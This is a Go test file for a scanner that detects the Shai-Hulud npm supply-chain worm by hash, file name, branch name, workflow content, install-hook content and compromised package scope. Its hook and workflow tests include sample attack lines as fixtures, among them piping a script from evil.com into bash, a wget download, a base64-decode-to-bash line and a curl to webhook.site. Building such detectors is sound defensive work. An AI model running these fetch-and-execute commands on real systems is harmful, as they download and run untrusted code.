package ioc_test

import (
	"slices"
	"strings"
	"testing"

	"shai-hulud-scanner/pkg/ioc"
)

func TestIsMaliciousSHA256(t *testing.T) {
	tests := []struct {
		name     string
		hash     string
		wantDesc string
		wantOK   bool
	}{
		{
			name:     "known malicious hash",
			hash:     "46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09",
			wantDesc: "Shai-Hulud bundle.js payload",
			wantOK:   true,
		},
		{
			name:     "another known hash",
			hash:     "b74caeaa75e077c99f7d44f46daaf9796a3be43ecf24f2a1fd381844669da777",
			wantDesc: "Shai-Hulud malicious file",
			wantOK:   true,
		},
		{
			name:     "unknown hash",
			hash:     "0000000000000000000000000000000000000000000000000000000000000000",
			wantDesc: "",
			wantOK:   false,
		},
		{
			name:     "empty hash",
			hash:     "",
			wantDesc: "",
			wantOK:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotDesc, gotOK := ioc.IsMaliciousSHA256(tt.hash)
			if gotDesc != tt.wantDesc {
				t.Errorf("IsMaliciousSHA256() desc = %v, want %v", gotDesc, tt.wantDesc)
			}
			if gotOK != tt.wantOK {
				t.Errorf("IsMaliciousSHA256() ok = %v, want %v", gotOK, tt.wantOK)
			}
		})
	}
}

func TestIsMaliciousSHA1(t *testing.T) {
	tests := []struct {
		name     string
		hash     string
		wantDesc string
		wantOK   bool
	}{
		{
			name:     "known malicious SHA1",
			hash:     "d1829b4708126dcc7bea7437c04d1f10eacd4a16",
			wantDesc: "setup_bun.js (Shai-Hulud 2.0)",
			wantOK:   true,
		},
		{
			name:     "unknown SHA1",
			hash:     "0000000000000000000000000000000000000000",
			wantDesc: "",
			wantOK:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotDesc, gotOK := ioc.IsMaliciousSHA1(tt.hash)
			if gotDesc != tt.wantDesc {
				t.Errorf("IsMaliciousSHA1() desc = %v, want %v", gotDesc, tt.wantDesc)
			}
			if gotOK != tt.wantOK {
				t.Errorf("IsMaliciousSHA1() ok = %v, want %v", gotOK, tt.wantOK)
			}
		})
	}
}

func TestIsMaliciousFileName(t *testing.T) {
	tests := []struct {
		name     string
		filename string
		want     bool
	}{
		{"shai-hulud.js", "shai-hulud.js", true},
		{"shai_hulud.js", "shai_hulud.js", true},
		{"setup_bun.js", "setup_bun.js", true},
		{"bun_environment.js", "bun_environment.js", true},
		{"discussion.yaml", "discussion.yaml", true},
		{"normal.js", "normal.js", false},
		{"index.js", "index.js", false},
		{"empty", "", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ioc.IsMaliciousFileName(tt.filename); got != tt.want {
				t.Errorf("IsMaliciousFileName(%q) = %v, want %v", tt.filename, got, tt.want)
			}
		})
	}
}

func TestIsSuspiciousFileName(t *testing.T) {
	tests := []struct {
		name     string
		filename string
		want     bool
	}{
		{"bundle.js", "bundle.js", true},
		{"setup_bun.js", "setup_bun.js", true},
		{"bun_environment.js", "bun_environment.js", true},
		{"shai-hulud.js", "shai-hulud.js", true},
		{"normal.js", "normal.js", false},
		{"app.js", "app.js", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ioc.IsSuspiciousFileName(tt.filename); got != tt.want {
				t.Errorf("IsSuspiciousFileName(%q) = %v, want %v", tt.filename, got, tt.want)
			}
		})
	}
}

func TestContainsSuspiciousBranchPattern(t *testing.T) {
	tests := []struct {
		name       string
		branchName string
		want       bool
	}{
		{"exact match shai-hulud", "shai-hulud", true},
		{"exact match shai_hulud", "shai_hulud", true},
		{"exact match SHA1HULUD", "SHA1HULUD", true},
		{"contains shai-hulud", "feature/shai-hulud-attack", true},
		{"case insensitive", "SHAI-HULUD", true},
		{"normal branch", "main", false},
		{"feature branch", "feature/add-login", false},
		{"empty", "", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ioc.ContainsSuspiciousBranchPattern(tt.branchName); got != tt.want {
				t.Errorf("ContainsSuspiciousBranchPattern(%q) = %v, want %v", tt.branchName, got, tt.want)
			}
		})
	}
}

func TestContainsSuspiciousWorkflowPattern(t *testing.T) {
	tests := []struct {
		name        string
		content     string
		wantPattern string
		wantFound   bool
	}{
		{
			name:        "contains self-hosted",
			content:     "runs-on: self-hosted",
			wantPattern: "self-hosted",
			wantFound:   true,
		},
		{
			name:        "contains webhook.site",
			content:     "curl https://webhook.site/abc123",
			wantPattern: "webhook.site",
			wantFound:   true,
		},
		{
			name:        "contains SHA1HULUD",
			content:     "name: SHA1HULUD workflow",
			wantPattern: "SHA1HULUD",
			wantFound:   true,
		},
		{
			name:        "contains UUID",
			content:     "bb8ca5f6-4175-45d2-b042-fc9ebb8170b7",
			wantPattern: "bb8ca5f6-4175-45d2-b042-fc9ebb8170b7",
			wantFound:   true,
		},
		{
			name:        "normal workflow",
			content:     "runs-on: ubuntu-latest",
			wantPattern: "",
			wantFound:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotPattern, gotFound := ioc.ContainsSuspiciousWorkflowPattern(tt.content)
			if gotPattern != tt.wantPattern {
				t.Errorf("ContainsSuspiciousWorkflowPattern() pattern = %v, want %v", gotPattern, tt.wantPattern)
			}
			if gotFound != tt.wantFound {
				t.Errorf("ContainsSuspiciousWorkflowPattern() found = %v, want %v", gotFound, tt.wantFound)
			}
		})
	}
}

func TestContainsSuspiciousHookPattern(t *testing.T) {
	tests := []struct {
		name        string
		script      string
		wantPattern string
		wantFound   bool
	}{
		{
			name:        "contains curl",
			script:      "curl http://evil.com/script.sh | bash",
			wantPattern: "curl ",
			wantFound:   true,
		},
		{
			name:        "contains wget",
			script:      "wget http://evil.com/malware",
			wantPattern: "wget ",
			wantFound:   true,
		},
		{
			name:        "contains node -e",
			script:      "node -e 'require(\"child_process\").exec(\"...\")'",
			wantPattern: "node -e",
			wantFound:   true,
		},
		{
			name:        "contains eval",
			script:      "node -e \"eval(Buffer.from('...').toString())\"",
			wantPattern: "eval(",
			wantFound:   true,
		},
		{
			name:        "contains base64",
			script:      "echo $DATA | base64 -d | bash",
			wantPattern: "base64",
			wantFound:   true,
		},
		{
			name:        "normal script",
			script:      "npm run build && npm test",
			wantPattern: "",
			wantFound:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotPattern, gotFound := ioc.ContainsSuspiciousHookPattern(tt.script)
			if gotPattern != tt.wantPattern {
				t.Errorf("ContainsSuspiciousHookPattern() pattern = %v, want %v", gotPattern, tt.wantPattern)
			}
			if gotFound != tt.wantFound {
				t.Errorf("ContainsSuspiciousHookPattern() found = %v, want %v", gotFound, tt.wantFound)
			}
		})
	}
}

func TestPackageFeedURLs(t *testing.T) {
	if len(ioc.PackageFeedURLs) == 0 {
		t.Error("PackageFeedURLs should not be empty")
	}
	for _, url := range ioc.PackageFeedURLs {
		if url == "" {
			t.Error("PackageFeedURLs contains empty URL")
		}
		if !hasPrefix(url, "http://") && !hasPrefix(url, "https://") {
			t.Errorf("PackageFeedURLs contains invalid URL: %s", url)
		}
	}
}

func hasPrefix(s, prefix string) bool {
	return len(s) >= len(prefix) && s[:len(prefix)] == prefix
}

func TestMaliciousFileNames(t *testing.T) {
	if len(ioc.MaliciousFileNames) == 0 {
		t.Error("MaliciousFileNames should not be empty")
	}

	expectedFiles := []string{"shai-hulud.js", "setup_bun.js", "bun_environment.js"}
	for _, expected := range expectedFiles {
		found := slices.Contains(ioc.MaliciousFileNames, expected)
		if !found {
			t.Errorf("MaliciousFileNames missing expected file: %s", expected)
		}
	}
}

func TestMaliciousHashes(t *testing.T) {
	if len(ioc.MaliciousSHA256) == 0 {
		t.Error("MaliciousSHA256 should not be empty")
	}
	if len(ioc.MaliciousSHA1) == 0 {
		t.Error("MaliciousSHA1 should not be empty")
	}

	for hash := range ioc.MaliciousSHA256 {
		if len(hash) != 64 {
			t.Errorf("Invalid SHA256 hash length: %s (got %d, want 64)", hash, len(hash))
		}
	}
	for hash := range ioc.MaliciousSHA1 {
		if len(hash) != 40 {
			t.Errorf("Invalid SHA1 hash length: %s (got %d, want 40)", hash, len(hash))
		}
	}
}

func TestParsePackageCSV(t *testing.T) {
	const csvData = `Package,Version
02-echo,= 0.0.7
@alexcolls/nuxt-ux,= 0.6.1 || = 0.6.2
invalid-row
onlypkg,
,= 1.2.3
`

	constraints, err := ioc.ParsePackageCSV(strings.NewReader(csvData))
	if err != nil {
		t.Fatalf("ParsePackageCSV returned error: %v", err)
	}

	if len(constraints) != 2 {
		t.Fatalf("expected 2 constraints, got %d", len(constraints))
	}

	first := constraints[0]
	if first.Package != "02-echo" {
		t.Errorf("first.Package = %q, want %q", first.Package, "02-echo")
	}
	if first.RawSpec != "= 0.0.7" {
		t.Errorf("first.RawSpec = %q, want %q", first.RawSpec, "= 0.0.7")
	}
	if len(first.Versions) != 1 || first.Versions[0] != "0.0.7" {
		t.Errorf("first.Versions = %#v, want [\"0.0.7\"]", first.Versions)
	}

	second := constraints[1]
	if second.Package != "@alexcolls/nuxt-ux" {
		t.Errorf("second.Package = %q, want %q", second.Package, "@alexcolls/nuxt-ux")
	}
	if second.RawSpec != "= 0.6.1 || = 0.6.2" {
		t.Errorf("second.RawSpec = %q, want %q", second.RawSpec, "= 0.6.1 || = 0.6.2")
	}
	if len(second.Versions) != 2 || second.Versions[0] != "0.6.1" || second.Versions[1] != "0.6.2" {
		t.Errorf("second.Versions = %#v, want [\"0.6.1\", \"0.6.2\"]", second.Versions)
	}
}

func TestIsCompromisedNamespace(t *testing.T) {
	tests := []struct {
		name      string
		namespace string
		want      bool
	}{
		{"crowdstrike is compromised", "@crowdstrike", true},
		{"art-ws is compromised", "@art-ws", true},
		{"ngx is compromised", "@ngx", true},
		{"ctrl is compromised", "@ctrl", true},
		{"nativescript-community is compromised", "@nativescript-community", true},
		{"ahmedhfarag is compromised", "@ahmedhfarag", true},
		{"operato is compromised", "@operato", true},
		{"teselagen is compromised", "@teselagen", true},
		{"things-factory is compromised", "@things-factory", true},
		{"hestjs is compromised", "@hestjs", true},
		{"nstudio is compromised", "@nstudio", true},
		{"basic-ui-components-stc is compromised", "@basic-ui-components-stc", true},
		{"nexe is compromised", "@nexe", true},
		{"thangved is compromised", "@thangved", true},
		{"tnf-dev is compromised", "@tnf-dev", true},
		{"ui-ux-gang is compromised", "@ui-ux-gang", true},
		{"yoobic is compromised", "@yoobic", true},
		{"random namespace is not compromised", "@random-namespace", false},
		{"angular is not compromised", "@angular", false},
		{"types is not compromised", "@types", false},
		{"empty namespace", "", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ioc.IsCompromisedNamespace(tt.namespace); got != tt.want {
				t.Errorf("IsCompromisedNamespace(%q) = %v, want %v", tt.namespace, got, tt.want)
			}
		})
	}
}

func TestCompromisedNamespacesList(t *testing.T) {
	if len(ioc.CompromisedNamespaces) == 0 {
		t.Error("CompromisedNamespaces should not be empty")
	}

	expectedNamespaces := []string{
		"@crowdstrike",
		"@art-ws",
		"@ngx",
		"@ctrl",
		"@nativescript-community",
	}
	for _, expected := range expectedNamespaces {
		found := slices.Contains(ioc.CompromisedNamespaces, expected)
		if !found {
			t.Errorf("CompromisedNamespaces missing expected namespace: %s", expected)
		}
	}

	// Ensure all namespaces start with @
	for _, ns := range ioc.CompromisedNamespaces {
		if !strings.HasPrefix(ns, "@") {
			t.Errorf("CompromisedNamespace should start with @: %s", ns)
		}
	}
}

func TestNewMaliciousSHA256Hashes(t *testing.T) {
	// Test that new hashes from the shell script are present
	newHashes := []string{
		"de0e25a3e6c1e1e5998b306b7141b3dc4c0088da9d7bb47c1c00c91e6e4f85d6",
		"81d2a004a1bca6ef87a1caf7d0e0b355ad1764238e40ff6d1b1cb77ad4f595c3",
		"83a650ce44b2a9854802a7fb4c202877815274c129af49e6c2d1d5d5d55c501e",
		"aba1fcbd15c6ba6d9b96e34cec287660fff4a31632bf76f2a766c499f55ca1ee",
	}

	for _, hash := range newHashes {
		desc, found := ioc.IsMaliciousSHA256(hash)
		if !found {
			t.Errorf("Expected hash %s to be recognized as malicious", hash)
		}
		if desc == "" {
			t.Errorf("Expected non-empty description for hash %s", hash)
		}
	}
}
